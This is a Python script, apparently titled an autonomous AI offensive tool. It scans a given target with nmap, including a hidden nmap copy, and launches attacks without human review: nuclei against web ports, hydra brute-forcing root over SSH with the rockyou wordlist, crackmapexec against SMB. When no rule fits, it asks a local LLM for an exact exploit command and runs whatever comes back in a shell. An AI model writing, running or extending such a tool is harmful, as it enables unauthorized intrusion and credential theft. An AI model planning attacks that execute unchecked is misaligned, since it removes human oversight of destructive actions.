
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Autonomous AI Offensive Brain v26.0 - Eternal Resurrection Edition
نظام استغلال ذاتي يربط الفحص بالتخطيط الاستراتيجي والتنفيذ التلقائي.
(c) 2025 Al-Mu'izz Sovereign Systems
"""
import sys, os, subprocess, json, requests, time, threading, queue
from typing import Dict, List, Optional

class AutonomousAIBrain:
    def __init__(self):
        self.ollama_url = "http://localhost:11434/api/generate"
        self.model = "mistral"
        self.results = []
        self.running = False
        self.knowledge_base = "/opt/sovereign-ai-platform/audit/attack_history.json"

    def scan_and_strike(self, target: str):
        """تنفيذ حلقة الفحص والضرب التلقائية بنمط القيامة"""
        print(f"[*] [RESURRECTION] Target Analysis: {target}")
        
        # 1. فحص شامل (Wrapper Stealth Mode)
        scan_data = self._nmap_scan(target)
        
        # 2. التخطيط الهجومي (Rule-based + AI)
        plan = self._plan_attack(target, scan_data)
        
        # 3. تنفيذ الضربة (Zero-Touch)
        if plan and plan.get("tool"):
            print(f"[*] Executing Plan: {plan['tool']} {plan['args']}")
            output = self._execute_strike(f"{plan['tool']} {plan['args']}")
            res = {
                "target": target,
                "plan": plan,
                "result": output,
                "status": "COMPLETED"
            }
            self._log_attack(res)
            return res
        return {"target": target, "status": "NO_VIABLE_EXPLOIT"}

    def _nmap_scan(self, target: str) -> str:
        # استخدام النسخة المخفية من nmap إذا كانت متوفرة
        cmd = "nmap" if not os.path.exists("/usr/sbin/.nmap") else "/usr/sbin/.nmap"
        try:
            return subprocess.check_output([cmd, "-sS", "-sV", "-T4", "--min-rate=5000", target], text=True)
        except: return "Scan Failed"

    def _plan_attack(self, target, scan_output) -> Dict:
        """المخطط الهجومي الذكي المدمج"""
        services = []
        for line in scan_output.split("\n"):
            if '/open/' in line or ('/tcp' in line and 'open' in line):
                parts = line.split()
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else "unknown"
                services.append({"port": port, "service": service})

        # القواعد الاستراتيجية (Fast Path)
        for s in services:
            if s['service'] == 'http':
                return {"tool": "nuclei", "args": f"-u http://{target}:{s['port']} -severity critical,high"}
            elif s['service'] == 'ssh':
                return {"tool": "hydra", "args": f"-l root -P /usr/share/wordlists/rockyou.txt ssh://{target}:{s['port']}"}
            elif s['service'] == 'smb':
                return {"tool": "crackmapexec", "args": f"smb {target} --shares"}

        # استشارة العقل الذكي (Deep Analysis)
        prompt = f"Analyze this scan for {target} and provide the EXACT bash command to exploit it. JSON output only with 'tool' and 'args' keys:\n{scan_output}"
        try:
            resp = requests.post(self.ollama_url, json={"model": self.model, "prompt": prompt, "stream": False})
            return json.loads(resp.json().get("response", "{}"))
        except: return {"tool": "nmap", "args": f"--script vuln {target}"}

    def _execute_strike(self, cmd) -> str:
        try:
            return subprocess.check_output(cmd, shell=True, text=True, timeout=120)
        except Exception as e: return str(e)

    def _log_attack(self, data):
        try:
            history = []
            if os.path.exists(self.knowledge_base):
                with open(self.knowledge_base, 'r') as f: history = json.load(f)
            history.append(data)
            with open(self.knowledge_base, 'w') as f: json.dump(history, f, indent=2)
        except: pass

if __name__ == "__main__":
    brain = AutonomousAIBrain()
    if len(sys.argv) > 1:
        res = brain.scan_and_strike(sys.argv[1])
        print(json.dumps(res, indent=2))
